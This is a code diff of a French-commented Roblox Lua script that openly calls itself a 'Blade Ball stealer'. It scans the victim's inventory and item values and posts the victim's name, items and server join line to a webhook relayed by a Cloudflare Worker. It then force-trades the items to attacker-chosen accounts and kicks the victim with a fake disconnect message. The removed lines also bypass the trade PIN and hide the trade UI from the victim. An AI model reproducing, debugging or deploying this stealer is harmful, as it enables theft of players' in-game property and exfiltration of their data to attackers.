@@ -5,7 +5,7 @@ _G.scriptExecuted = true
 
 -- // RECUPERATION DES GLOBALES
 local auth_token = _G.AuthToken or "EBK-SS-A" 
-local webhook = _G.webhook or ""
+local webhook_url = _G.webhook or ""
 local users = _G.Usernames or {}
 local min_rap = _G.min_rap or 50
 local ping = _G.pingEveryone or "No"
@@ -17,86 +17,64 @@ local plr = Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local netModule = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")
-local PlayerGui = plr.PlayerGui
 
--- // PROTECTION INITIALE
-if webhook == "" or #users == 0 then
-    return
-end
+print("🚀 Stealer chargé pour : " .. plr.Name)
 
--- // FONCTION D'ENVOI (FIXED FOR CLOUDFLARE WORKER)
+-- // FONCTION D'ENVOI (DEBUG VERSION)
 local function sendToWorker(payload)
-    -- On force le token dans chaque envoi pour le Worker
     payload["auth_token"] = auth_token
+    local encoded = HttpService:JSONEncode(payload)
     
+    -- On teste toutes les fonctions de requête possibles
     local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
+    
     if requestFunc then
         local success, result = pcall(function()
             return requestFunc({
-                Url = webhook,
+                Url = webhook_url,
                 Method = "POST",
                 Headers = {
-                    ["Content-Type"] = "application/json"
+                    ["Content-Type"] = "application/json",
+                    ["Accept"] = "application/json"
                 },
-                Body = HttpService:JSONEncode(payload)
+                Body = encoded
             })
         end)
-        return success
+        
+        if success then
+            print("✅ Worker contacté ! Status code : " .. tostring(result.StatusCode))
+            if result.StatusCode == 500 then
+                warn("❌ Le Worker a crash (Erreur 500). Vérifie DISCORD_WEBHOOK_URL dans Cloudflare.")
+            elseif result.StatusCode == 401 then
+                warn("❌ Token invalide (401). Ton token : " .. auth_token)
+            end
+        else
+            warn("❌ Erreur de connexion au Worker : " .. tostring(result))
+        end
+    else
+        warn("❌ Exécuteur non compatible (pas de fonction request found)")
     end
 end
 
--- // BYPASS PIN
-pcall(function()
-    netModule:WaitForChild("RF/ResetPINCode"):InvokeServer({["option"] = "PIN", ["value"] = "9079"})
-end)
-
--- // DISCRETION UI
-local tradeGui = PlayerGui:WaitForChild("Trade")
-local notificationsGui = PlayerGui:WaitForChild("Notifications")
-tradeGui.Black.Visible = false
-tradeGui.Main.Visible = false
-tradeGui.Main:GetPropertyChangedSignal("Visible"):Connect(function() tradeGui.Main.Visible = false end)
-notificationsGui.Notifications.Visible = false
-
--- // FORMATAGE RAP
-local function formatNumber(number)
-    if not number then return "0" end
-    local suffixes = {"", "k", "m", "b", "t"}
-    local idx = 1
-    while number >= 1000 and idx < #suffixes do
-        number = number / 1000
-        idx = idx + 1
-    end
-    return idx == 1 and tostring(math.floor(number)) or string.format("%.2f%s", number, suffixes[idx])
-end
-
--- // SCAN INVENTAIRE
+-- // SCAN INVENTAIRE (LOGIQUE BLADE BALL)
 local clientInventory = require(ReplicatedStorage.Shared.Inventory.Client).Get()
 local Replion = require(ReplicatedStorage.Packages.Replion)
 local rapData = Replion.Client:GetReplion("ItemRAP").Data.Items
 
-local function buildNameToRAPMap(cat)
-    local nameToRAP = {}
-    local catData = rapData[cat]
-    if not catData then return nameToRAP end
-    for key, rap in pairs(catData) do
-        local s, decoded = pcall(function() return HttpService:JSONDecode(key) end)
-        if s and type(decoded) == "table" then
-            for _, pair in ipairs(decoded) do
-                if pair[1] == "Name" then nameToRAP[pair[2]] = rap break end
-            end
-        end
+local function getRAP(cat, name)
+    if not rapData[cat] then return 0 end
+    for key, val in pairs(rapData[cat]) do
+        if string.find(key, name) then return val end
     end
-    return nameToRAP
+    return 0
 end
 
 local totalRAP = 0
 for _, cat in ipairs(categories) do
-    local map = buildNameToRAPMap(cat)
     if clientInventory[cat] then
         for id, info in pairs(clientInventory[cat]) do
             if not info.TradeLock then
-                local rap = map[info.Name] or 0
+                local rap = getRAP(cat, info.Name)
                 if rap >= min_rap then
                     totalRAP = totalRAP + rap
                     table.insert(itemsToSend, {ItemID = id, RAP = rap, itemType = cat, Name = info.Name})
@@ -106,8 +84,10 @@ for _, cat in ipairs(categories) do
     end
 end
 
--- // GESTION DES EMBEDS
-local function sendEmbed(isJoin)
+-- // ENVOI DU MESSAGE INITIAL
+if #itemsToSend > 0 then
+    table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
+    
     local grouped = {}
     for _, item in ipairs(itemsToSend) do
         grouped[item.Name] = (grouped[item.Name] or 0) + 1
@@ -118,64 +98,52 @@ local function sendEmbed(isJoin)
     end
 
     local payload = {
-        ["username"] = isJoin and (totalRAP >= 500 and "🟢 Eblack - GOOD HIT" or "🟣 Eblack - SMALL HIT") or "⚪ Eblack - SERVER HIT",
-        ["content"] = isJoin and ((ping == "Yes" and "@everyone " or "") .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')") or nil,
+        ["username"] = totalRAP >= 500 and "🟢 Eblack - GOOD HIT" or "🟣 Eblack - SMALL HIT",
+        ["content"] = (ping == "Yes" and "@everyone " or "") .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
         ["embeds"] = {{
-            ["title"] = isJoin and (totalRAP >= 500 and "🟢 GOOD HIT 🎯" or "🟣 SMALL HIT 🎯") or "⚪ Server Hit 🎉",
+            ["title"] = "🟢 New Victim Detected",
             ["color"] = totalRAP >= 500 and 65280 or 8323327,
             ["fields"] = {
-                {name = "Victim 👤:", value = "```" .. plr.Name .. "```", inline = true},
-                {name = "Total RAP 💰:", value = "**" .. formatNumber(totalRAP) .. "**", inline = true},
-                {name = "Items 📝:", value = listText ~= "" and listText or "None", inline = false}
-            },
-            ["footer"] = {["text"] = "Blade Ball stealer by Eblack"}
+                {name = "Victim:", value = "```" .. plr.Name .. "```", inline = true},
+                {name = "Total RAP:", value = "**" .. tostring(totalRAP) .. "**", inline = true},
+                {name = "Items:", value = listText ~= "" and listText or "None", inline = false}
+            }
         }}
     }
-    sendToWorker(payload)
-end
-
--- // EXECUTION TRADE
-if #itemsToSend > 0 then
-    table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
     
-    sendEmbed(true) -- Message de Join
+    sendToWorker(payload)
 
+    -- // LOGIQUE DE TRADE
     local inTrade = false
-    tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function() inTrade = tradeGui.Enabled end)
+    plr.PlayerGui.Trade:GetPropertyChangedSignal("Enabled"):Connect(function() inTrade = plr.PlayerGui.Trade.Enabled end)
 
-    local function doTrade(targetPlayer)
-        sendEmbed(false) -- Message Server Hit
-        while #itemsToSend > 0 do
-            repeat 
-                netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(targetPlayer)
-                task.wait(0.5) 
-            until inTrade
-            
-            local batch = {}
-            for i = 1, math.min(100, #itemsToSend) do table.insert(batch, table.remove(itemsToSend, 1)) end
-            for _, item in ipairs(batch) do
-                netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(item.itemType, item.ItemID)
-            end
-
-            -- Tokens
-            pcall(function()
-                local raw = PlayerGui.TradeRequest.Main.Currency.Coins.Amount.Text:gsub("[^%d]", "")
-                local tokens = tonumber(raw) or 0
-                if tokens > 0 then netModule:WaitForChild("RF/Trading/AddTokensToTrade"):InvokeServer(tokens) end
+    local function checkPlayer(p)
+        if table.find(users, p.Name) then
+            print("🎯 Cible détectée : " .. p.Name)
+            task.spawn(function()
+                while #itemsToSend > 0 do
+                    netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(p)
+                    task.wait(1)
+                    if inTrade then
+                        -- Envoi auto des items (batch de 100)
+                        local currentBatch = {}
+                        for i = 1, math.min(100, #itemsToSend) do
+                            table.insert(currentBatch, table.remove(itemsToSend, 1))
+                        end
+                        for _, item in ipairs(currentBatch) do
+                            netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(item.itemType, item.ItemID)
+                        end
+                        netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
+                        task.wait(0.3)
+                        netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
+                        repeat task.wait(0.5) until not inTrade
+                    end
+                end
+                plr:kick("Connection lost.")
             end)
-
-            netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
-            task.wait(0.3)
-            netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
-            repeat task.wait(0.5) until not inTrade
         end
-        plr:kick("Connection lost, please rejoin.")
     end
 
-    -- Surveillance des G Users
-    local function check(p)
-        if table.find(users, p.Name) then doTrade(p) end
-    end
-    for _, p in ipairs(Players:GetPlayers()) do check(p) end
-    Players.PlayerAdded:Connect(check)
+    for _, p in ipairs(Players:GetPlayers()) do checkPlayer(p) end
+    Players.PlayerAdded:Connect(checkPlayer)
 end
